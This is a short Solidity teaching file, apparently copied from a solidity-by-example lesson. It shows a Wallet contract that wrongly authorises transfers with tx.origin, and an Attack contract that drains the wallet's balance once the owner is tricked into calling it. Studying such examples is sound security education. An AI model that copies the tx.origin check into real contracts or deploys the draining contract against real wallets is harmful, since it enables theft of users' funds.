// SPDX-License-Identifier: GPL-3.0
// (exact) Source: https://solidity-by-example.org/0.6/hacks/phishing-with-tx-origin/
pragma solidity ^0.7.0;

/*
X -> Y -> Z

lets look at Y->Z part
tx.origin: X
msg.sender: Y
caller of transfer function: Z

*/


contract Wallet {
    address public owner;

    constructor() public payable {
        owner = msg.sender;
    }
    
    // blank, the money is by default put in "balance" variable
    // as address(this).balance
    function deposit() public payable{}

    function transfer(address payable _to, uint _amount) public {
        require(tx.origin == owner, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
    
    function getBalance() public view returns(uint){
        return address(this).balance;
    }
}

contract Attack {
    // owner is the one who deploys the contract.
    // the one who gets the heist money
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) public {
        wallet = Wallet(_wallet);
        owner = msg.sender;
    }

    // Now, the attacker tricks the owner of the wallet 
    // into calling the attack function
    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}
